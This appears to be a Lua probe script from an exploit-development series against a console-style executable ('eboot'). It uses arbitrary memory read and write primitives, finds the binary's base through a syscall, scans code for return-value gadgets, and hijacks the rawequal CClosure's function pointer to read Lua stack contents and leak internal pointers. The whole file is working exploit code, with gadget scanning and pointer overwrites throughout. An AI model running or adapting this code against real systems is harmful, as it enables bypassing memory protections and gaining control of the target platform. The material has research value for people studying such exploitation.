-- CRASH_CLASS: MODERATE
-- PROBE 56d5: Deep Lua stack read via CClosure retcount
--
-- 56d4 confirmed: mov eax,1;ret at eboot+0x1AB0C6 makes rawequal(111,222)
-- return 222 (last arg read from stack). Now scan wider for rax=2..10
-- to read below the args into Lua internal state — potential pointer leak.

print("=== PROBE 56d5: DEEP STACK READ ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function fmt(v)
    if v == nil then return "nil" end
    if type(v) == "string" then return '"' .. tostring(v):sub(1,30) .. '"' end
    if type(v) == "boolean" then return tostring(v) end
    if type(v) == "table" and v.h then
        local h, l = v.h, v.l
        if h < 0 then h = h + 0x100000000 end
        if l < 0 then l = l + 0x100000000 end
        return string.format("u64:0x%08X%08X", h, l)
    end
    if type(v) == "number" then return string.format("%g", v) end
    return type(v) .. ":" .. tostring(v)
end

local stub = syscall.pipe.fn_addr
local pid = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid end

local info = memory.alloc(0x200)
wd(N(info), 0x160)
pcall(function() mk(593)(uint64(0), info) end)
local tlo = rd(N(info) + 0x108) or 0
local thi = rd(N(info) + 0x10C) or 0
if tlo < 0 then tlo = tlo + 0x100000000 end
if thi < 0 then thi = thi + 0x100000000 end
print(string.format("eboot=0x%X%08X", thi, tlo))

local function eaddr(off)
    return uint64(string.format("0x%X%08X", thi, tlo + off))
end

-- Known gadgets
local G0 = 0x471       -- xor eax,eax;ret (rax=0)
local G1 = 0x1AB0C6    -- mov eax,1;ret (rax=1)

-- Get rawequal CClosure address
local re_s = tostring(rawequal)
local re_a_str = re_s:match("0x([0-9a-fA-F]+)") or re_s:match(": ([0-9a-fA-F]+)$") or re_s:match(": (%d+)$")
local re_a = tonumber(re_a_str, 16) or tonumber(re_a_str)
print(string.format("rawequal=0x%X", re_a))

-- ============ SCAN: 128KB around Lua funcs for rax=2..20 ============
print("")
print("[1] Scan for rax=2..20 gadgets (128KB)")

local gadgets = {}
gadgets[0] = G0
gadgets[1] = G1

local re_fn_off = N(rq(re_a + 0x20)) - tlo
local scan_base = re_fn_off - 0x10000
if scan_base < 0 then scan_base = 0 end

local CHUNK = 0x4000
local RANGE = 0x20000  -- 128KB

for chunk_off = 0, RANGE - CHUNK, CHUNK do
    local cs = scan_base + chunk_off
    local dwords = {}
    local count = CHUNK / 4
    for i = 0, count - 1 do
        dwords[i] = rd(tlo + cs + i * 4) or 0
    end

    for i = 0, count - 2 do
        local d0 = dwords[i]
        local d1 = dwords[i + 1]
        local b = {}
        b[0] = d0 % 256
        b[1] = math.floor(d0 / 256) % 256
        b[2] = math.floor(d0 / 65536) % 256
        b[3] = math.floor(d0 / 16777216) % 256
        b[4] = d1 % 256
        b[5] = math.floor(d1 / 256) % 256
        b[6] = math.floor(d1 / 65536) % 256
        b[7] = math.floor(d1 / 16777216) % 256

        for s = 0, 2 do
            -- B8 XX 00 00 00 C3
            if b[s] == 0xB8 and b[s+2] == 0 and b[s+3] == 0
               and b[s+4] == 0 and b[s+5] == 0xC3 then
                local val = b[s+1]
                if val >= 2 and val <= 20 and not gadgets[val] then
                    gadgets[val] = cs + i * 4 + s
                    print(string.format("  rax=%d at eboot+0x%X", val, gadgets[val]))
                end
            end
        end
    end

    dwords = nil
    collectgarbage("collect")
end

print("")
print("[2] Gadget inventory")
for val = 0, 10 do
    if gadgets[val] then
        print(string.format("  rax=%d → eboot+0x%X", val, gadgets[val]))
    end
end

-- ============ TESTS ============
local function redir_test(nret, args_str, call_fn)
    if not gadgets[nret] or not alive() then return end
    local saved = rq(re_a + 0x20)
    pcall(function() memory.write_qword(re_a + 0x20, eaddr(gadgets[nret])) end)
    local r = {pcall(call_fn)}
    pcall(function() memory.write_qword(re_a + 0x20, saved) end)

    local ok = r[1]
    local parts = {}
    for i = 2, math.min(#r, 12) do
        parts[#parts + 1] = fmt(r[i])
    end
    print(string.format("  rax=%d %s: ok=%s n=%d [%s]",
        nret, args_str, tostring(ok), #r - 1, table.concat(parts, " | ")))
end

-- Test rax=1 (confirmed working)
print("")
print("[3] Stack reads with 2 args: rawequal(111, 222)")
redir_test(0, "rax=0", function() return rawequal(111, 222) end)
redir_test(1, "rax=1", function() return rawequal(111, 222) end)
redir_test(2, "rax=2", function() return rawequal(111, 222) end)
redir_test(3, "rax=3", function() return rawequal(111, 222) end)
redir_test(4, "rax=4", function() return rawequal(111, 222) end)
redir_test(5, "rax=5", function() return rawequal(111, 222) end)

-- Test with 0 args (reads deeper)
print("")
print("[4] Stack reads with 0 args: rawequal()")
redir_test(1, "rax=1", function() return rawequal() end)
redir_test(2, "rax=2", function() return rawequal() end)
redir_test(3, "rax=3", function() return rawequal() end)

-- Test with string args (to see type info)
print("")
print("[5] Stack reads with strings: rawequal('X', 'Y')")
redir_test(1, "rax=1", function() return rawequal("X", "Y") end)
redir_test(2, "rax=2", function() return rawequal("X", "Y") end)
redir_test(3, "rax=3", function() return rawequal("X", "Y") end)

-- Test with userdata (might have internal pointers)
print("")
print("[6] Stack reads with table + nil")
redir_test(1, "rax=1", function() return rawequal({}, nil) end)
redir_test(2, "rax=2", function() return rawequal({}, nil) end)
redir_test(3, "rax=3", function() return rawequal({}, nil) end)

print("")
print("[F] Stability")
if alive() then
    print(string.format("  rawequal(1,1)=%s (1,2)=%s", tostring(rawequal(1,1)), tostring(rawequal(1,2))))
end

print("")
print("canary=" .. (alive() and "OK" or "FAIL"))
print("=== 56d5 COMPLETE ===")
